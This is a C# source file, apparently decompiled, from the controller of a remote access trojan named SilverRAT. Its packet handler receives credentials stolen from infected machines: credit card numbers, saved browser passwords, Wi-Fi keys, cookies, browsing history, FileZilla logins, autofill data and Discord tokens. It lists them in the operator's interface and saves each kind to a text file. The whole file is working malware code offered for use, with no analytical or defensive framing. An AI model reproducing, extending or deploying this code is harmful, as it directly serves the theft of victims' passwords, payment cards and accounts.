using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class HandlePasswords
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "CreditCards":
                    {
                        Passwords passwords3 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords3 != null)
                        {
                            TextWriter textWriter3 = new StreamWriter(passwords3.PathSave + "\\CreditCards.txt");
                            string asString3 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array3 = asString3.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num2;
                            for (num2 = 0; num2 <= array3.Length - 1; num2++)
                            {
                                if (array3[num2].Length > 0)
                                {
                                    string text6 = array3[num2];
                                    string text7 = array3[num2 + 1];
                                    string text8 = array3[num2 + 2];
                                    string text9 = array3[num2 + 3];
                                    string text10 = array3[num2 + 4];
                                    DataGridViewRow dataGridViewRow3 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text6.Contains("Chrome"))
                                    {
                                        dataGridViewRow3.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords3.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text6.Contains("Edge"))
                                    {
                                        dataGridViewRow3.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords3.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text6.Contains("FireFox"))
                                    {
                                        dataGridViewRow3.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords3.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow3.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords3.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text6
                                    });
                                    dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text7
                                    });
                                    dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text8
                                    });
                                    dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text9
                                    });
                                    dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text10
                                    });
                                    passwords3.ListCreditCards.Rows.Add(dataGridViewRow3);
                                    try
                                    {
                                        textWriter3.Write("=======================================================");
                                        textWriter3.WriteLine();
                                        textWriter3.Write("name : " + text6);
                                        textWriter3.WriteLine();
                                        textWriter3.Write("Type : " + text7);
                                        textWriter3.WriteLine();
                                        textWriter3.Write("Number : " + text8);
                                        textWriter3.WriteLine();
                                        textWriter3.Write("ExpMonth : " + text9);
                                        textWriter3.WriteLine();
                                        textWriter3.Write("Username : " + text10);
                                        textWriter3.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num2 += 4;
                            }
                            textWriter3.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Password":
                    {
                        new StringBuilder();
                        Passwords passwords4 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords4 != null)
                        {
                            TextWriter textWriter4 = new StreamWriter(passwords4.PathSave + "\\Passwords.txt");
                            string asString4 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array4 = asString4.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num3;
                            for (num3 = 0; num3 <= array4.Length - 1; num3++)
                            {
                                if (array4[num3].Length > 0)
                                {
                                    string text11 = array4[num3];
                                    string text12 = array4[num3 + 1];
                                    string text13 = array4[num3 + 2];
                                    string text14 = array4[num3 + 3];
                                    DataGridViewRow dataGridViewRow4 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text11.Contains("Chrome"))
                                    {
                                        dataGridViewRow4.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords4.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text11.Contains("Edge"))
                                    {
                                        dataGridViewRow4.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords4.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text11.Contains("FireFox"))
                                    {
                                        dataGridViewRow4.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords4.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow4.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords4.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow4.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text11
                                    });
                                    dataGridViewRow4.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text12
                                    });
                                    dataGridViewRow4.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text13
                                    });
                                    dataGridViewRow4.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text14
                                    });
                                    passwords4.ListPasswords.Rows.Add(dataGridViewRow4);
                                    try
                                    {
                                        textWriter4.Write("=======================================================");
                                        textWriter4.WriteLine();
                                        textWriter4.Write("App : " + text11);
                                        textWriter4.WriteLine();
                                        textWriter4.Write("Username : " + text12);
                                        textWriter4.WriteLine();
                                        textWriter4.Write("Password : " + text13);
                                        textWriter4.WriteLine();
                                        textWriter4.Write("Url : " + text14);
                                        textWriter4.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num3 += 3;
                            }
                            textWriter4.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Wifi":
                    {
                        Passwords passwords9 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords9 != null)
                        {
                            TextWriter textWriter8 = new StreamWriter(passwords9.PathSave + "\\Wifi.txt");
                            string asString8 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array8 = asString8.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num7;
                            for (num7 = 0; num7 <= array8.Length - 1; num7++)
                            {
                                if (array8[num7].Length > 0)
                                {
                                    string text29 = array8[num7];
                                    string text30 = array8[num7 + 1];
                                    DataGridViewRow dataGridViewRow8 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    dataGridViewRow8.Cells.Add(new DataGridViewImageCell
                                    {
                                        Value = passwords9.imageList1.Images["Wifi.png"],
                                        ImageLayout = DataGridViewImageCellLayout.Zoom
                                    });
                                    dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = "WiFi"
                                    });
                                    dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text29
                                    });
                                    dataGridViewRow8.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text30
                                    });
                                    passwords9.ListWifi.Rows.Add(dataGridViewRow8);
                                    try
                                    {
                                        textWriter8.Write("=======================================================");
                                        textWriter8.WriteLine();
                                        textWriter8.Write("Wifi Info");
                                        textWriter8.WriteLine();
                                        textWriter8.Write("Profile : " + text29);
                                        textWriter8.WriteLine();
                                        textWriter8.Write("Password : " + text30);
                                        textWriter8.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num7++;
                            }
                            textWriter8.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "History":
                    {
                        Passwords passwords2 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords2 != null)
                        {
                            TextWriter textWriter2 = new StreamWriter(passwords2.PathSave + "\\History.txt");
                            string asString2 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array2 = asString2.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array2.Length - 1; num++)
                            {
                                if (array2[num].Length > 0)
                                {
                                    string text2 = array2[num];
                                    string text3 = array2[num + 1];
                                    string text4 = array2[num + 2];
                                    string text5 = array2[num + 3];
                                    DataGridViewRow dataGridViewRow2 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text2.Contains("Chrome"))
                                    {
                                        dataGridViewRow2.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords2.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text2.Contains("Edge"))
                                    {
                                        dataGridViewRow2.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords2.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text2.Contains("FireFox"))
                                    {
                                        dataGridViewRow2.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords2.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow2.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords2.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text2
                                    });
                                    dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text4
                                    });
                                    dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text3
                                    });
                                    dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text5
                                    });
                                    passwords2.ListHostiry.Rows.Add(dataGridViewRow2);
                                    try
                                    {
                                        textWriter2.Write("=======================================================");
                                        textWriter2.WriteLine();
                                        textWriter2.Write("name : " + text2);
                                        textWriter2.WriteLine();
                                        textWriter2.Write("Title : " + text4);
                                        textWriter2.WriteLine();
                                        textWriter2.Write("URL : " + text3);
                                        textWriter2.WriteLine();
                                        textWriter2.Write("Count : " + text5);
                                        textWriter2.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num += 3;
                            }
                            textWriter2.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Cookies":
                    {
                        Passwords passwords8 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords8 != null)
                        {
                            TextWriter textWriter7 = new StreamWriter(passwords8.PathSave + "\\Cookies.txt");
                            string asString7 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array7 = asString7.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num6;
                            for (num6 = 0; num6 <= array7.Length - 1; num6++)
                            {
                                if (array7[num6].Length > 0)
                                {
                                    string text21 = array7[num6];
                                    string text22 = array7[num6 + 1];
                                    string text23 = array7[num6 + 2];
                                    string text24 = array7[num6 + 3];
                                    string text25 = array7[num6 + 4];
                                    string text26 = array7[num6 + 5];
                                    string text27 = array7[num6 + 6];
                                    string text28 = array7[num6 + 7];
                                    DataGridViewRow dataGridViewRow7 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text21.Contains("Chrome"))
                                    {
                                        dataGridViewRow7.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords8.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text21.Contains("Edge"))
                                    {
                                        dataGridViewRow7.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords8.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text21.Contains("FireFox"))
                                    {
                                        dataGridViewRow7.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords8.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow7.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords8.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text21
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text22
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text23
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text24
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text25
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text26
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text27
                                    });
                                    dataGridViewRow7.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text28
                                    });
                                    passwords8.ListCookies.Rows.Add(dataGridViewRow7);
                                    try
                                    {
                                        textWriter7.Write("=======================================================");
                                        textWriter7.WriteLine();
                                        textWriter7.Write("name : " + text21);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Username : " + text22);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Key : " + text23);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Secure : " + text24);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Host key : " + text25);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Expires : " + text26);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Value : " + text27);
                                        textWriter7.WriteLine();
                                        textWriter7.Write("Path : " + text28);
                                        textWriter7.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num6 += 7;
                            }
                            textWriter7.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Market":
                    {
                        Passwords passwords5 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords5 != null)
                        {
                            TextWriter textWriter5 = new StreamWriter(passwords5.PathSave + "\\Market.txt");
                            string asString5 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array5 = asString5.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num4;
                            for (num4 = 0; num4 <= array5.Length - 1; num4++)
                            {
                                if (array5[num4].Length > 0)
                                {
                                    string text15 = array5[num4];
                                    string text16 = array5[num4 + 1];
                                    string text17 = array5[num4 + 2];
                                    DataGridViewRow dataGridViewRow5 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text15.Contains("Chrome"))
                                    {
                                        dataGridViewRow5.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords5.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text15.Contains("Edge"))
                                    {
                                        dataGridViewRow5.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords5.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text15.Contains("FireFox"))
                                    {
                                        dataGridViewRow5.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords5.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow5.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords5.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow5.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text15
                                    });
                                    dataGridViewRow5.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text16
                                    });
                                    dataGridViewRow5.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text17
                                    });
                                    passwords5.ListMarket.Rows.Add(dataGridViewRow5);
                                    try
                                    {
                                        textWriter5.Write("=======================================================");
                                        textWriter5.WriteLine();
                                        textWriter5.Write("App : " + text15);
                                        textWriter5.WriteLine();
                                        textWriter5.Write("Name : " + text16);
                                        textWriter5.WriteLine();
                                        textWriter5.Write("Value : " + text17);
                                        textWriter5.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num4 += 2;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "FileZilla":
                    {
                        Passwords passwords7 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords7 != null)
                        {
                            TextWriter textWriter6 = new StreamWriter(passwords7.PathSave + "\\FileZilla.txt");
                            string asString6 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array6 = asString6.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num5;
                            for (num5 = 0; num5 <= array6.Length - 1; num5++)
                            {
                                if (array6[num5].Length > 0)
                                {
                                    string text18 = array6[num5];
                                    string text19 = array6[num5 + 1];
                                    string text20 = array6[num5 + 2];
                                    DataGridViewRow dataGridViewRow6 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    dataGridViewRow6.Cells.Add(new DataGridViewImageCell
                                    {
                                        Value = passwords7.imageList1.Images["FileZilla.png"],
                                        ImageLayout = DataGridViewImageCellLayout.Zoom
                                    });
                                    dataGridViewRow6.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = "FileZilla"
                                    });
                                    dataGridViewRow6.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text18
                                    });
                                    dataGridViewRow6.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text19
                                    });
                                    dataGridViewRow6.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text20
                                    });
                                    passwords7.ListFilezilla.Rows.Add(dataGridViewRow6);
                                    try
                                    {
                                        textWriter6.Write("=======================================================");
                                        textWriter6.WriteLine();
                                        textWriter6.Write("App : FileZilla");
                                        textWriter6.WriteLine();
                                        textWriter6.Write("Username : " + text18);
                                        textWriter6.WriteLine();
                                        textWriter6.Write("Password : " + text19);
                                        textWriter6.WriteLine();
                                        textWriter6.Write("Url : " + text20);
                                        textWriter6.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num5 += 2;
                            }
                            textWriter6.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "AutoFiles":
                    {
                        Passwords passwords10 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords10 != null)
                        {
                            TextWriter textWriter9 = new StreamWriter(passwords10.PathSave + "\\AutoFiles.txt");
                            string asString9 = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array9 = asString9.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            int num8;
                            for (num8 = 0; num8 <= array9.Length - 1; num8++)
                            {
                                if (array9[num8].Length > 0)
                                {
                                    string text31 = array9[num8];
                                    string text32 = array9[num8 + 1];
                                    string text33 = array9[num8 + 2];
                                    DataGridViewRow dataGridViewRow9 = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    if (text31.Contains("Chrome"))
                                    {
                                        dataGridViewRow9.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords10.imageList1.Images["chrome.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text31.Contains("Edge"))
                                    {
                                        dataGridViewRow9.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords10.imageList1.Images["edge.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else if (text31.Contains("FireFox"))
                                    {
                                        dataGridViewRow9.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords10.imageList1.Images["FireFox.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    else
                                    {
                                        dataGridViewRow9.Cells.Add(new DataGridViewImageCell
                                        {
                                            Value = passwords10.imageList1.Images["else.png"],
                                            ImageLayout = DataGridViewImageCellLayout.Zoom
                                        });
                                    }
                                    dataGridViewRow9.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text31
                                    });
                                    dataGridViewRow9.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text32
                                    });
                                    dataGridViewRow9.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text33
                                    });
                                    passwords10.ListAutoFiles.Rows.Add(dataGridViewRow9);
                                    try
                                    {
                                        textWriter9.Write("=======================================================");
                                        textWriter9.WriteLine();
                                        textWriter9.Write("App : " + text31);
                                        textWriter9.WriteLine();
                                        textWriter9.Write("Name : " + text32);
                                        textWriter9.WriteLine();
                                        textWriter9.Write("Value : " + text33);
                                        textWriter9.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                                num8 += 2;
                            }
                            textWriter9.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        Passwords passwords6 = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords6 != null)
                        {
                            if (passwords6.Client == null)
                            {
                                passwords6.Client = client;
                                passwords6.LoaderConnect.Visible = false;
                                passwords6.Timer1.Start();
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Discord":
                    {
                        Passwords passwords = (Passwords)Application.OpenForms["Passwords:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (passwords != null)
                        {
                            TextWriter textWriter = new StreamWriter(passwords.PathSave + "\\Discord.txt");
                            string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            for (int i = 0; i <= array.Length - 1; i++)
                            {
                                if (array[i].Length > 0)
                                {
                                    string text = array[i];
                                    DataGridViewRow dataGridViewRow = new DataGridViewRow
                                    {
                                        Height = 20
                                    };
                                    dataGridViewRow.Cells.Add(new DataGridViewImageCell
                                    {
                                        Value = passwords.imageList1.Images["Discord.png"],
                                        ImageLayout = DataGridViewImageCellLayout.Zoom
                                    });
                                    dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = "Token"
                                    });
                                    dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = text
                                    });
                                    passwords.ListDiscord.Rows.Add(dataGridViewRow);
                                    try
                                    {
                                        textWriter.Write("=======================================================");
                                        textWriter.WriteLine();
                                        textWriter.Write("Discord Token : " + text);
                                        textWriter.WriteLine();
                                    }
                                    catch
                                    {
                                    }
                                }
                            }
                            textWriter.Close();
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
